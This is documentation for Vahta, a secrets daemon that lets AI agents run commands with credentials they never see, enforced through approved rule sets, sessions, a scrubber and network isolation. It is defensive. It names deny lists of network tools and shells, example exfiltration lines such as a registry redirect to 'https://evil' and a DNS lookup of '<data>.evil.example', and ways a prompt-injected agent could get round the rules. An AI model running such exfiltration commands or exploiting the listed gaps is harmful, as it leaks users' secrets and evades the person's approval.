# The Vahta daemon: sessions, `vahta run` and the vault commands

Vahta keeps a project's secrets in an encrypted vault, `.vahta/vault.vht`, and
lets an agent *use* them without ever *seeing* them. The pieces that do that are
a small background process, the daemon, and the `vahta` commands that talk to it.

This page says what each command does, what you will see, and, at the end, what
Vahta does not protect against.

## The idea in one paragraph

You type the vault password, and any secret you store, in a **window the daemon
opens**, never in the terminal an agent is reading and never on a command line.
The agent runs `vahta run`; the **daemon** starts the command with the secrets in
its environment and sends the output back with the secrets taken out. The agent
gets an exit code and scrubbed output, and never a value.

## Commands

Every command that needs the password opens a **new terminal window** (never the
one you or the agent typed in) showing what is about to happen, then asks. If no
window can be opened (no display, no terminal found) the command fails and says
nothing was done.

| Command | What it does | Password |
|---|---|---|
| `vahta init` | Create `.vahta/` and the vault here. The recovery key is shown once, in the window. | new password, twice |
| `vahta add NAME [--tier session\|each-use] [--file FILENAME]` | Store a new secret. The value is typed in the window, hidden, twice. A name the vault already has is refused (exit 3). A value with a space, tab or line break at either end, or a line break or tab inside, is asked about before it is stored (see below). | yes |
| `vahta tier NAME session\|each-use` | Change a secret's tier without typing its value again. Same tier or an unknown name: refused (exit 3). | yes |
| `vahta reset NAME [--tier session\|each-use] [--file FILENAME]` | Replace the value of a secret the vault has, as when rotating it. It keeps its tier and kind unless the flags say otherwise. A name the vault does not have is refused (exit 3). | yes |
| `vahta remove NAME` | Remove a secret. | yes |
| `vahta import --ka PATH` / `--dotenv PATH` | Add the secrets of a ka vault or a `.env` file. The daemon reads the file itself. A name the vault already has refuses the whole import. | yes (and the ka password for `--ka`) |
| `vahta reveal NAME` | Show the value in the window until a key is pressed or 60 seconds pass. | yes |
| `vahta copy NAME` | Put the value on the clipboard; it is cleared after 30 seconds if it is unchanged. Needs `wl-copy`, `xclip`, `xsel`, `pbcopy` or `clip`. | yes |
| `vahta unlock [--vault DIR] [--secret NAME]... [--for DURATION] [--label TEXT]` | Open a **session** (below). With `--vault`, a session for another project's vault, bound to the pair ([Using a vault from another project](#using-a-vault-from-another-project)). | yes |
| `vahta lock [--all]` | End this project's sessions, or all of them. | no |
| `vahta sessions [--json]` / `vahta sessions kill ID` | List sessions, or end one and everything below it. | no |
| `vahta run [--vault DIR] [--secret NAME]... [--as NAME=VAR]... [--ask [--reason TEXT]] -- COMMAND` | Run a command with secrets in its environment. A secret with command rules only goes to commands they allow; `--ask` asks the person about one they do not. | only without a session |
| `vahta http [--vault DIR] --secret NAME [-H 'Name: {NAME}']... [--query K={NAME}]... [-X METHOD] [-d TEXT\|@FILE] [--json] URL` | One HTTPS request made by the daemon, with the secret put in a header or query value; only to hosts the secret is bound to (below). | only without a session |
| `vahta bind [NAME] [--allow RULE]... [--deny RULE]... [--from PROJECT]... [--no-from] [--clear] [--reason TEXT]` | Propose which commands may use a secret (and which other projects may use it), or approve the rules in `vahta.toml`. The person approves in the window. | yes |
| `vahta remote [on\|off]` | Let this project's vault be used from other projects, or stop. Plain `remote` only says which. | yes, to change it |
| `vahta delegate --secret NAME... [--for DURATION] -- COMMAND` | Give a sub-agent a narrower session. | no |
| `vahta delegate --role ROLE [--secret NAME]... [--for DURATION] -- COMMAND` | The same, limited to an approved agent role: only what the role allows, inside each secret's rules; the deadline is the shortest of `--for`, the role's `for` and the parent's. | no |
| `vahta role [NAME] [--remove] [--reason TEXT]` | Propose the `[roles.NAME]` of `vahta.toml` (or remove one). Refused with no window when wider than a secret's rules; otherwise the person approves it once. See [agent-usage.md](agent-usage.md#proposing-a-role-for-a-task). | yes |
| `vahta output allow REF [--reason TEXT]` | Ask the person to show the agent what the hook cut out of a tool's output (see [hooks.md](hooks.md)). | only without a session |
| `vahta list [--vault DIR]`, `vahta check [--vault DIR]` | Names, kinds, tiers, classes and whether rules are approved; compare with `vahta.toml`. | no (they read the signed name index) |
| `vahta devices` | List the phones paired with this vault: name, id, when paired, when their access ends, when last used, and which unlock method is current. | no |
| `vahta config unlock [--global] [password\|device NAME\|last\|default]` | Show or set which unlock method is tried first. See [The current unlock method](#the-current-unlock-method). | no |
| `vahta devices pair NAME [--for DURATION]` / `extend ID [--for DURATION]` / `revoke ID` / `lost ID` | Pair a phone, give it more time, remove it, or remove it and change the vault's key. See [Devices](#devices-factors-re-keying-and-recovery). | the master password, always |
| `vahta recover` | The password is forgotten: the recovery key opens the vault and a new password is chosen. | the recovery key |
| `vahta daemon run\|status\|stop\|restart` | The daemon itself. | no |

**Stray whitespace in a value.** `add` and `reset` check the typed value before
storing it. A pasted token often carries a trailing line break or space, and
then every use fails (a 401, say) with nothing to say why. If the value starts
or ends with whitespace, or has a line break or a tab inside, the window says so
in words ("The value you typed ends with a space, a tab or a line break...";
never the value or any part of it) and offers: **Trim it and store** (only when
trimming the ends fixes everything), **Store exactly as typed**, **Type it
again**, or **Cancel**. A file secret (`--file`, or an existing file entry) and a
PEM block (`-----BEGIN ...` and `-----END ...`) may have many lines, so line
breaks inside them, and a final one, are not asked about; spaces around them
and invisible characters inside still are. The journal records a
`value_warning` event with the answer (`trimmed`, `as_typed`, `retype`,
`cancelled`) and the name, never the value. `import` reads values from a file
and is not checked.

None of these takes a secret or the password as an argument or on standard input.
There is no flag for it, on purpose.

There is no `vahta set`: one command that adds or overwrites lets a mistyped
name replace a secret, or a rotation quietly create a second one. `vahta set`
says which of the two to use.

`vh` is the short name of `vahta`: the same program, so `vh run -- …` is
`vahta run -- …`.

### Exit codes

| Code | Meaning |
|---|---|
| 0 | done |
| the command's | `vahta run` and `vahta delegate` pass the command's exit code through (128 plus the signal for a command a signal ended) |
| 1 | the request failed |
| 2 | usage |
| 3 | **refused**, with a reason (see below) |
| 4 | the window was cancelled, or nobody answered |
| 5 | the daemon is not available |

A refusal is structured. With `--json` the answer names the kind and each name and
why, so an agent that made a mistake can rebuild the command:

```json
{"ok": false, "refused": {"kind": "each_use", "message": "...", "names": [{"name": "DB_PASSWORD", "why": "each_use"}]}}
```

## Tiers

A secret is **session** (the default) or **each-use**.

- A *session* secret can be held by a session, so `vahta run` can use it without a
  window while a session is open.
- An *each-use* secret needs the password **every time** and never enters a
  session. Use it for the few things you want a person to approve each time.

## Sessions

`vahta unlock` is meant to be called by the agent. A window opens and shows you the
project, the vault, the names, how long, and **which process the session belongs
to** (its name and pid). You read it and type the password. From then on, `vahta
run` from that process, and from everything it starts, needs no window.

- **Scope.** Without `--secret`, every session-tier secret in the project's vault.
  With `--secret A --secret B`, only those. Naming an each-use secret, or one that
  does not exist, refuses the *whole* request before any window opens (exit 3),
  and the refusal goes to the journal.
- **Length.** 30 minutes by default (`session_minutes` in `config.toml`);
  `--for 2h` (also `90s`, `1h30m`, a clock such as `1:30:00`) per unlock;
  `--for forever` until revoked.
- **Extension.** Two minutes before a session ends (halfway, for one shorter than
  four minutes) a window offers: extend by the session's last length (what it was opened
  for, or the last extension chosen), no, or
  another duration typed as `15m`, `1h30m` or `1:30:00` (up to a year, never
  `forever`). While a duration is typed the session is held open for up to two
  minutes. No password, because the keys are still in memory. With no answer the
  session ends at its deadline, and a new one needs the password.
- **The anchor.** A session belongs to an *anchor* process and everything it
  starts. The anchor is the nearest ancestor of the calling `vahta` that is not a
  shell or a wrapper (`bash`, `zsh`, `sudo`, `env`, `timeout`, ...), so Claude
  Code's `bash -c` anchors to `claude`. A shell sitting directly under a terminal,
  `sshd`, `login`, a `tmux` server or `systemd` is the anchor itself, so your own
  `vahta unlock` covers the shell you typed it in and nothing else. The anchor must
  be yours, above the lowest pid and more than two levels above init.
- **Role.** A session is a *runner*: it can `run` and nothing else. `reveal`,
  `copy`, `export` and every write need a fresh password.
- **Label.** `--label` lets the agent say why. It is shown in the window marked
  "from the agent, not verified", cleaned to one plain line of at most 200
  characters. What you approve is the list Vahta renders, not the label.
- **Ending.** At the deadline, when the anchor process exits, on `vahta lock` or
  `vahta sessions kill`, when the daemon stops, and (Linux, `lock_on_sleep`, on by
  default) when the machine suspends or the screen locks: through logind
  (`loginctl lock-session`, or a desktop that sets `LockedHint`, as GNOME and
  KDE do), or, under Hyprland, a lock screen such as hyprlock or Omarchy's.
  Ending a session also ends every session below it and overwrites its keys.
- **Changes.** If a secret is changed after a session opened, a read through the
  session fails with "changed since this session was opened; unlock again" (exit
  3). It never quietly falls back to something else. `vahta reset`, `remove`
  and `tier … each-use` say so up front: their answer and their window name each
  open session that holds the old value (its program, pid and label), so the
  agent or the person can unlock again or restart that agent, and the journal
  records `sessions_stale`.

### Delegation

`vahta delegate --secret A --for 10m -- sub-agent ...` narrows *your* session for a
sub-agent. The new session covers a subset of yours, ends no later than yours, and
belongs to the `vahta delegate` process, so it ends when the sub-agent does. A
secret your session does not have, or a longer time, is a hard refusal with no
window. When several sessions match, the narrowest wins: a `vahta run` inside the
sub-agent can use only what it was given and never asks you for more.

## `vahta run`

```
vahta run --secret API_KEY --as API_KEY=SERVICE_TOKEN -- ./deploy.sh
```

- **Names.** `--secret NAME` (repeatable), else every name in `vahta.toml` that the
  vault holds. The variable is `--as NAME=VAR`, else the `env` of NAME in
  `vahta.toml`, else the name.
- **When there is a window.** If the caller's session covers every name and all
  are session-tier, none. Otherwise a window asks for the password *for this one
  run* and no session is created. An each-use secret always asks, even inside a
  session.
- **The command** gets your arguments, working directory and environment, minus
  `LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH`, `DYLD_*` and `VAHTA_*`, plus the
  secrets. For a secret of the `publish` or `payment` category the environment
  is cut down further: only the category's `env_keep` list (compiled in:
  `crates/policy/categories`), the injected variables and `PATH`, `HOME`,
  `USER`, `LOGNAME`, `LANG`, `LC_*`, `TERM`, `TMPDIR`, `TZ` pass (with several
  secrets, what every restricted category keeps), so
  `NPM_CONFIG_REGISTRY=https://evil npm publish` runs without the variable. The
  run window warns about dropped variables that could redirect the program
  (`NPM_CONFIG_*`, `CARGO_REGISTR*`, `PIP_*`, proxies and the like) by name and
  counts the rest; the journal does the same (never values). For any secret it
  also shows, for any secret, the arguments beyond the allowed prefix
  (`cargo publish --manifest-path /elsewhere/Cargo.toml` shows
  `Extra arguments: --manifest-path /elsewhere/Cargo.toml`). A program's own
  config files (`.npmrc`, `.cargo/config.toml`) can still redirect it; Vahta
  does not read them. Standard input is relayed, Ctrl-C and termination are forwarded, the
  exit code passes through, and if `vahta run` is killed the command is ended.
- **Output** comes back with every value replaced by `***REDACTED(NAME)***`.
  Matches are found even when a value is split across two reads, overlaps another
  value, or contains one.
- **Children inherit the session.** A `vahta run` from inside a command the daemon
  started uses the same session.

## Rule sets and categories
## `vahta http`

```
vahta http --secret STRIPE_KEY -H 'Authorization: Bearer {STRIPE_KEY}' https://api.stripe.com/v1/balance
vahta http --secret MAPS_KEY --query key={MAPS_KEY} --json https://maps.example.com/geocode?q=Oslo
```

The daemon makes the request, so the command and the agent never hold the value,
and the response comes back with every value taken out. It is the one operation
in Vahta that opens a network connection.

- **Where a value goes.** Only where `{NAME}` stands in a header value or a
  `--query` value. Never in the URL path (paths end up in every server, proxy
  and CDN log), never in a header or query *name*, and never in the body: servers
  echo bodies back (validation errors, debug pages), and the scrubber should not
  be the first line of defence. A `{NAME}` in the URL, a name or the body is
  refused, not sent, and so is a `--secret` that no header or query value uses.
  A provider that needs its key in a JSON body is a later decision.
  A `{...}` that is not a declared name is sent as written. Query values are
  percent-encoded by Vahta; pass them raw.
- **Host binding.** A secret may only be sent to hosts its approved rule set
  lists (`Network::Hosts`): the URL's host equals a rule's host, or lies beneath
  it when the rule has `subdomains`; the port equals the rule's, or any port when
  the rule has none (the URL's port is 443 unless it says otherwise). Everything
  else is refused (exit 3) before any window or connection, naming the secret and
  the fix: no rule set, `Network::None`, and `Network::App` (the application's own
  network use, which is what a command-only binding approves) are refused with
  `vahta bind NAME --net hosts:HOST` as the proposal. All secrets of a request
  must pass. The person's approval is the check; the agent can only propose.
  A name that resolves to a loopback, private, shared (100.64/10), link-local or
  unspecified address is not connected to (the address checked is the one used), and
  the error says which address and how to allow it: the host written `private:HOST`
  (`--net hosts:private:db.internal.example:5432`). The relay under `vahta run`
  applies the same rule. A role cannot be given `private:` for a host its secret's
  rule lists without it.
- **Values.** The same as `vahta run`: a session that covers the names, else a
  window asks for the password for this one request (it shows the secrets and
  `METHOD host`); each-use secrets always ask; a delegated session cannot ask for
  more.
- **The client.** https only (`http://` is refused), certificates checked
  against the Mozilla roots with rustls (ring), no cookies, no proxy (the
  `HTTPS_PROXY` family is not read), connect timeout 10 s and 30 s in all
  (`--timeout`, at most 120), response kept up to 4 MiB (`--max-bytes`, at most
  8 MiB; the cut is reported). Redirects are never followed by the library; at
  most 3 are followed by Vahta, **only on the same host and port**, with the
  same headers. A redirect elsewhere is not followed: the redirect itself is
  returned, `vahta http` exits 1 and says where it pointed (host only). The URL
  is strict ASCII with no user name, backslash or fragment; an IP address or a
  name in odd forms (`0x7f.1`) is refused, and an IP literal needs a certificate
  for it.
- **The response.** The body and the header values pass through the scrubber
  with the values of this request, in the encoded forms `vahta run` uses
  (base64, hex, URL-encoded, reversed). Set-Cookie and headers whose names say
  authorization, token, secret, api-key or session are dropped. Without `--json`
  the body goes to standard output, a status of 400 or more is noted on standard
  error, and the exit code is 0 below 400 and 1 otherwise. With `--json`, one
  object: `status`, `headers`, `body`, `truncated`, `redirect_stopped`.
- **The journal** gets `http_request` (or `http_refused`): the names, the
  method, the host (and port when not 443), the status and the size of the body.
  Never the path, the query or a value.
- **A build without it.** The client is the `http` feature of `vahta-daemon` and
  `vahta-cli` (on by default, `crates/net`). With `--no-default-features` the
  binary contains no HTTP or TLS client, and `vahta http` says so. CI checks that
  no network crate is reachable from any crate but `vahta-net`. The promise is
  therefore: the open build makes a network request only for an operation you
  bound a secret to.

## Binding secrets to commands

**Every secret has rules.** A secret with none is refused (`vahta run` exits 3
with `no_rules` and no window): nothing may use it until a rule set is approved.
The refusal tells the agent how to propose one. Rules are not a policy for a few
secrets; they are how a secret is added.

**The agent proposes, the person approves.** Vahta does not guess which commands
a project uses. The agent reads the project, designs the rules **once, up
front**, and the person approves them in one window with the password, so the
person is asked as rarely as possible afterwards and the agent has all the
freedom the rules give. While designing, the agent walks through how a prompt
injection could misuse this one secret (a network tool, an interpreter, a shell,
writing the value to a file, sending it to another host) and closes those paths
in the rules now. The category's checklist (below) is repeated to the agent
in the `add` reply and in the no-rules refusal.

### A rule set

One set per secret, signed inside the vault (the file `vahta.toml` only
proposes):

| Part | What it says |
|---|---|
| `category` | A starting set (below); kept for display and for downgrade detection |
| `allow` | Programs that may use it, by resolved path, with an optional argv prefix |
| `deny` | Programs that may not, by name or group; **deny wins** |
| `dirs` | Folders: the command runs inside one, and scripts inside one need no rule |
| `network` | `none`, `hosts` (a list; on Linux the command reaches only those hosts over TLS through a relay, elsewhere only `vahta http` is bound to them) or `app` |

```toml
[secrets.STRIPE_KEY]
description = "Stripe live key"
category = "payment"
network = "hosts"
hosts = ["api.stripe.com"]
allow = ["printenv"]
deny = ["@shells", "@interpreters", "@network"]

[secrets.DEPLOY_TOKEN]
category = "ordinary"
allow = ["./scripts/deploy.sh", "git push"]
dirs = ["./scripts"]
```

`category`, `dirs`, `network` and `hosts` are optional. A file that says nothing
about network proposes `app`. A secret the file lists with none of the rule keys
proposes nothing, so the approved rules stand (`vahta bind NAME --clear` removes
rules).

### Categories

The categories are TOML files in the repository (`crates/policy/categories/`),
reviewed like code and **compiled into the binary**. No file, setting or command
on a machine changes them, so an agent cannot rewrite one to suit itself.

| Category | Rank | Tier | Network | Always denies | Folders | Programs |
|---|---|---|---|---|---|---|
| `payment` | 6 | each-use | `hosts` (named) | shells, interpreters, network programs | no | optional |
| `publish` | 5 | each-use | `app` | shells, interpreters, network programs | no | required |
| `server` | 4 | session | `app` | shells, interpreters | yes | required |
| `database` | 3 | session | `app` | shells, interpreters, network programs | yes | required |
| `local-only` | 2 | session | `none` | shells, interpreters, network programs | yes | required |
| `ordinary` | 1 | session | `hosts`, `app` or `none` (default `app`) | shells, network programs | yes | optional |

- **Why these networks.** `payment` and `ordinary`-with-`hosts` have a fixed
  list of hosts, reached only through `vahta http`, so the command itself runs
  with no network (Linux). Database clients are not HTTP: `vahta http` cannot
  carry them and cutting the network would stop them, so `database` (like
  `server` and `publish`, whose tools speak their own protocols) uses `app` and
  relies on naming the client, denying shells, interpreters and network programs,
  and a narrow database role. `local-only` has no network at all.
- **Rank** orders how much a leak or misuse costs and how much oversight the
  defaults ask for. They are distinct on purpose. `local-only` ranks low although
  it is strict, since its tier is a session.
- **The category adds its denies** to what the agent proposes and refuses a
  proposal it cannot take (a payment key with `app` network, folders for a
  payment key, no program for a `server` key, an allowed `python` for a key whose
  category denies interpreters).
- **Which category.** `--category` names one. Left out, Vahta suggests the
  highest-ranked one that fits: the **class** of the value (vendor prefix:
  `sk_live_` payment, `AKIA`/`AIza` cloud, which points at `server`) and whole
  words of the name (`DATABASE`, `DB`, `POSTGRES`: database; `NPM`, `PYPI`,
  `GITHUB`: publish; `SIGNING`, `GPG`, `PASSPHRASE`: local-only; the cloud and
  payment words as before).

### Adding a secret: one window

`vahta add NAME [--category C] [--allow R]... [--deny R]... [--dir PATH]...
[--net none|app|hosts:H[,H...]] [--reason TEXT] [--tier session|each-use]`.
The agent's proposal is checked and its programs and folders resolved **before**
any window opens (a proposal that cannot be right is refused with no window). Then
one window: the password, the value (with the usual whitespace check), and the
rules in plain words:

> Payment key. Works only through Vahta with api.stripe.com. Only these may
> run: printenv. Never: @shells, @interpreters, @network. Asks you every time.

with the resolved program of every allow rule, the agent's reason (marked
unverified) and warnings (a program or folder the agent can write to, a launcher
or shell). The choices are **Accept**, **Use the default set for CATEGORY**
(the category's own deny groups and network, keeping the agent's programs; for a
category that needs hosts and has none, the window asks for them) and **Cancel**.
With no rule flags the proposal is the suggested category's default set. The
rules are stored in the same save as the secret and written to `vahta.toml`. The
tier is the category's unless `--tier` says otherwise (a session tier for a
category that asks every time is called out in the window). `reset` keeps the
rules and still offers each-use for a payment or cloud value.

**A downgrade is allowed, loudly.** If the agent's category ranks below the one
the value and name point at, the window's first warning reads: *This asks to
downgrade: the value looks like a payment key, whose default category is payment;
the agent proposes ordinary.* "Use the default set for payment" then overrules it
in one click. Accepting a downgrade stores `downgraded_from` with the rules and
writes `category_downgraded` to the journal.

### Evaluating a command (`vahta_policy::evaluate`)

In this order, for each secret in the run; the first that does not pass refuses:

1. **Deny.** By the program's file name, normalised (no `.exe`, no trailing
   version; `python3.12` is `python`), and by the name the caller typed; a launcher
   (`env curl ...`, `timeout 5 nc ...`) is looked through. Groups:

| Group | Programs |
|---|---|
| `@network` | curl, wget, nc, ncat, netcat, socat, http, https, xh, httpie, ssh, scp, sftp, rsync, ftp, telnet, aria2c, Invoke-WebRequest |
| `@shells` | sh, bash, zsh, fish, dash, ksh, csh, tcsh, pwsh, powershell, cmd, nu |
| `@interpreters` | python, node, deno, bun, ruby, perl, php, lua, osascript |

2. **Network cannot be cut** (see below): for `none` or `hosts`, a program in
   `@network`, `@shells` or `@interpreters` is refused.
3. **Folders**, when the set has any: the working directory must be inside one.
   Otherwise refused (adding a program cannot fix that).
4. **Programs.**
   - no `allow` and no folders: any program;
   - `allow` set: the resolved program matches an allow rule (canonical path and
     argv prefix) **or**, when there are folders, is a file inside one;
   - no `allow` but folders: the program must be inside a folder.
5. **Network.** `none` and `hosts` ask for a run with no network; `app` does not.
   Several secrets in one run: if any asks for no network, the whole run has none.

`write` on a folder (`PATH:ro`) is recorded and shown but not enforced yet.
Rules for programs: a rule is **one string**, the program then any leading
arguments (`git push` matches `git push origin`, not `git pull`); no quoting and
no patterns; a bare name is looked up in the caller's `PATH`; a name with a slash
is relative to the **project root**; `@group` is for `deny` only. **Allow matches
the file, not the name**: the program is resolved when you approve and again at
run time, following symlinks, and the daemon starts the resolved path.

### Using a vault from another project

A tool vault such as `~/Projects/ai-tools/.vahta` should serve `cargo publish`
run in `~/Projects/vahta`. A user-level or global vault is not the answer (that
is what Vahta left behind), and a bare `--vault` would let an injected agent in
any project ask for any vault on the machine. So three things must all hold, and
the daemon checks each of them itself.

1. **The vault opted in.** `vahta remote on` (run in the vault's own project)
   sets a flag in the signed vault: off by default, changed only in a window
   with the master password, journaled (`remote_set`). While it is off, a
   request that names the vault from outside its project tree fails with the
   same refusal as a path with no vault: no names, no counts, no hint that a
   vault is there. Turning it off also ends the sessions opened from other
   projects.
2. **The secret names the caller.** Each secret has a `from` list in its rule
   set: absolute, canonical project folders it may be used from, besides the
   vault's own project. Set with `vahta bind NAME --from /abs/project`
   (repeatable; `--no-from` clears) or `from = [...]` in `vahta.toml`, and
   approved like any rule: the window shows it in words ("also usable from the
   projects: ..."). The caller's project must be a listed folder or below it
   (the calling project is the nearest folder above the caller's directory with
   a `.vahta/`, `vahta.toml` or `.git`, else the directory itself). An empty
   list means the secret works only inside the vault's own project, as before. A
   secret the caller's project is not listed for is invisible to it: the
   refusal is the one for a name the vault does not have. `from` is separate
   from `dirs`, which stays about programs and work inside the vault's project;
   a secret with `dirs` cannot be used from elsewhere, because the working
   directory is outside them.
3. **The daemon knows where the caller is.** The client's `cwd` is a claim,
   and it is believed for no request. For every request that carries a `cwd`
   the daemon takes the peer's process id from the socket (`SO_PEERCRED`,
   `LOCAL_PEERPID`), checks it is the same process (start time, before and
   after), and reads its working directory from the kernel (`/proc/PID/cwd`,
   `proc_pidinfo` with `PROC_PIDVNODEPATHINFO`). The claim must equal it after
   canonicalisation (`vahta` always sends its real directory; a subdirectory is
   not accepted). Otherwise the request is refused (`not_from_here`), a
   `cwd_refused` journal line marked `suspicious` is written, and it counts for
   the injection alarm at once. The command runs in the verified directory. A
   process whose directory cannot be read (it exited, or the system hides it)
   is refused too. Exceptions: the hook's own messages (`CheckRun`,
   `CheckHttp`, `ToolCheck`, `OutputScan`, `HookReport`) keep the claimed `cwd`,
   because the hook is not the shell whose directory it reports and they only
   answer a question or feed the journal. **Windows** has no working-directory
   read yet: there the claim is believed, as before, and use of a vault from
   another project is refused with that reason; use inside the vault's own
   project works everywhere.

A project is a directory here: an agent that can change into a listed folder
is "in" that project for this purpose, as it is for every other per-project rule.
The three conditions narrow what a compromised agent in an unrelated project can
reach; they do not make a listed project safer than it is.

Everything else is the same as local use. The secret's category rules (allow,
deny, network, tier) apply in full; the windows and journal lines name both ends
(`Vault: <vault> · used from <project>`; journal field `used_from`); a session
opened with `--vault` belongs to the pair (vault, calling project) and covers
neither the same vault from a third project nor use at home; `vahta sessions`
lists the project it is used from. `vahta list --vault` and `check --vault`
(which read the signed index with no daemon) apply the same gate and show only
the secrets usable from the caller's project.

The hook mirrors this. `CheckRun {cwd, argv, names, path, vault}` and
`CheckHttp {cwd, url, names, vault}` carry the `--vault` of the command (made
absolute against `cwd`); the hook says allow only when the daemon says the run
would go. They are questions, not uses: nothing starts, and the daemon believes
the claimed `cwd` (the hook's own directory is not the shell's); the run that
follows is checked against the kernel.

### The hook's question (`CheckRun`)

Before a harness asks the person to approve a `vahta run`, the hook asks the
daemon the same question a run asks, without running anything: `CheckRun {cwd,
argv, names, path}`. The daemon finds the vault from `cwd`, peeks at it (no
password, no window, no session, nothing in the journal), finds the program on
the caller's `path`, and evaluates the rules of each named secret with the code
a run uses. It answers `Allowed` only if every secret exists, is session-tier,
has approved rules, and every verdict is allowed; anything else is `NoOpinion`,
never a refusal. `CheckHttp {cwd, url, names}` is the same question for `vahta
http`: `Allowed` only if every name is a session-tier secret with an approved
host list that matches the URL (the function a request uses). What the hook does with it: [hooks.md](hooks.md#running-unattended-when-the-hook-says-allow).

### The vault's copy is what counts

`vahta.toml` is a **proposal**: anyone who can push can edit it. The daemon
enforces the **approved copy inside the signed vault**; a change to the file takes
effect only after you approve it (`vahta bind`). Until then `vahta list` shows
`(toml differs)`, `vahta check` fails with the names, and a refused run says the
file's rules are not approved. `vahta list` shows each secret's category and
network (or `NO RULES`); `vahta check` lists them for the names in the file.

### `vahta bind`

- `vahta bind NAME --category C --allow stripe --deny @shells --dir ./scripts
  --net hosts:api.stripe.com --reason "..."` opens one window: the current rules
  and the proposed ones (the proposal **replaces** them), where each allowed
  program resolves, warnings (a file or folder in the project or a temp directory,
  a shell or interpreter, a downgrade) and the agent's reason, marked unverified.
  On **Approve** and the password it writes `vahta.toml` first, then the vault.
  With only `--allow`/`--deny` and rules already approved, the category, folders and
  network stay as they are. `--clear` removes the rules (nothing may use the
  secret until new ones are approved).
- `--from PROJECT` (repeatable) lists the other projects the secret may be used
  from ([above](#using-a-vault-from-another-project)). Given alone it changes
  only that and keeps the approved rules as they are; given with other rule
  options, the old `from` stays unless `--from` is given again. A folder that
  does not exist, a relative path and `/` are refused before any window.
- `vahta bind` with no name approves `vahta.toml` as written for every name whose
  entry proposes rules and differs from the vault.
- Nothing changes without the window and the password. An agent may call it; it
  only asks.

### A command that is not on the list

`vahta run` with a command the rules do not allow is **refused with exit 3 and no
window**. The message names the rules and the fix. Run it again with `--ask` and
the person is asked:

```
vahta run --ask --reason "deploy needs the key" --secret STRIPE_KEY -- ./scripts/deploy.sh
```

The window shows the secrets, the command, the resolved program, the rules and
the reason. The choices:

- **Allow once**: the run goes on and nothing is stored.
- **No**, or closing the window: nothing runs, exit 4.
- **Add to the list**: asks for the password again, then adds the program (as
  typed, no arguments) to the secret's `allow`, in `vahta.toml` first and then the
  vault, and runs. **Not offered** for a command a `deny` rule matches, a working
  directory outside the folders or a network that cannot be cut (these can only
  be allowed once), or when the ask comes from a delegated session.

The journal records `run_refused` (with the resolved program, never the
arguments; `no_rules` for a secret without rules), `run_allowed_once`,
`binding_added` and `category_downgraded`.

### What rules do not do

- **`allow` is the guard; `deny` is a speed bump.** A program in no group, or a
  renamed copy of one under a name the caller does not type, gets past a deny
  list. Prefer allowing exactly what is needed.
- **Allowing a program that runs other programs allows everything.** Shells,
  interpreters and launchers (`env`, `sudo`, `xargs`, `timeout`, `nohup`, `npx`...)
  start whatever their arguments name, and the windows warn about them. A deny
  rule looks past a launcher, but not into a shell string or a script.
- **A script or folder inside the project can be edited by the agent.** A rule
  names the file, not its contents; a folder lets any file put in it use the
  secret. The window warns; payment keys cannot be given folders.
- **An allowed program can itself pass the secret on.** `git push` with the key
  can send it anywhere that `git` is told to; a program that writes a file can
  leave the value where the agent reads it.
- The check and the start are two steps: a file replaced between them is not
  caught.
- **Deny groups do not cut the network; only "no network" does.** See below.

### Running with no network

A command can be started with no network at all, as opposed to a deny list of
program names.

- **Linux: real isolation.** The command starts in its own user and network
  namespace. It has no interface but a loopback that is down: it cannot connect
  to the internet, to services on `127.0.0.1` or the local network, whatever it is
  called, whether it is a renamed copy, an interpreter running a script, or
  something it starts itself. Its user and group id are mapped to your own, so it
  reads and writes the project exactly as before. This needs unprivileged user
  namespaces; some systems (Ubuntu 24.04 restricts them with AppArmor) turn them
  off. Then see the fallback below.
- **Unix sockets are closed off too.** The command also gets its own mount
  namespace in which `/run` (and `/var/run` where it is a real directory) and
  `/tmp/.X11-unix` are empty. The system and session buses, systemd-resolved (so a
  lookup of `<data>.evil.example` has nowhere to go), `docker.sock`, the XDG
  runtime directory and X11 are not there for it. Abstract Unix sockets belong to
  the network namespace, so they are gone as well. `/tmp` itself is untouched,
  since the project or temp files may live there.
- **Passed through: `/run/media` and `/run/mnt`.** These two are put back, with
  every mount below them, so a script that writes to a mounted SD card or USB
  stick (udisks mounts them at `/run/media/<user>/<label>`) keeps its files. They
  are safe to pass because they hold only mount points of block-device file
  systems, never a daemon socket (those are in `/run/user`, `/run/dbus`,
  `/run/systemd`, `/run/docker.sock` and the like, which stay empty), and a socket
  file on a stick has no listener behind it. This is an allowlist on purpose: a
  list of sockets to hide would leave open any that nobody listed. Nothing else
  under `/run` is passed.
- **Nothing is lost silently.** Under `/run` (outside the two above),
  `/var/run` or `/tmp/.X11-unix` a write would land in the empty directory and
  disappear. A run with no network is therefore refused, with a message, when its
  working directory or an absolute path argument (`/path` or `--flag=/path`) lies
  there. A path built inside the program cannot be checked: that program sees
  the empty directory.
- **What it does not cut.** A pathname Unix socket anywhere else is still
  reachable: in the project, in `/tmp`, in the home directory (some tools keep an
  agent or control socket there). It is not a file-system sandbox. If the mount
  setup fails, the run is refused.
- **macOS and Windows, or Linux with user namespaces off: no isolation.** There
  is no unprivileged way to do it. For a secret whose rules ask for `none` or
  `hosts`, Vahta then **refuses programs in `@network`, `@shells` and
  `@interpreters`** for that run, and says so in the refusal ("this system cannot
  cut the network"); any other program runs with the network on, and the journal
  says the network was not cut. That is a speed bump, not a wall: a program in no
  group, or a renamed copy, gets past it. A run that was asked to be isolated and
  whose isolation then fails at start is refused, never run open.

## The daemon

One runs per user, started on demand by the `vahta` commands (never by the agent
hook) and not a system service. It exits after 10 idle minutes (no sessions, no
connections). It listens on a Unix socket in a private runtime directory (a named
pipe only you can open, on Windows), and it knows who is calling from the
operating system, never from what the caller says.

If a newer `vahta` meets an older daemon with no sessions, the old one exits and a
new one starts. If it holds sessions, the command says so and points to `vahta
daemon restart` (which ends them).

On Linux the daemon is not dumpable and writes no core files, and it keeps every
key in memory that is wiped when it is dropped. Its memory is **not** locked
against swap: locking all of it makes the system refuse new threads once the
locked-memory limit is reached, and locking only the pages that hold keys is not
done yet. Use encrypted swap (or none) if a key paged to disk matters to you. A session keeps only the data keys of
the secrets it covers; the vault key is dropped right after the password is
checked.

### Configuration: `<config dir>/vahta/config.toml`

```toml
session_minutes = 30    # default length of `vahta unlock`
lock_on_sleep = true    # end sessions on suspend and screen lock (Linux)
lock_sources = ["logind", "hyprland"]   # which triggers; unset = all, [] = none
terminal = "kitty"      # the terminal the window opens in (Linux); empty = detect
idle_minutes = 10       # the daemon exits after this long with nothing to do
hook_output = "redact"  # or "observe": the hook only reports secrets in tool output
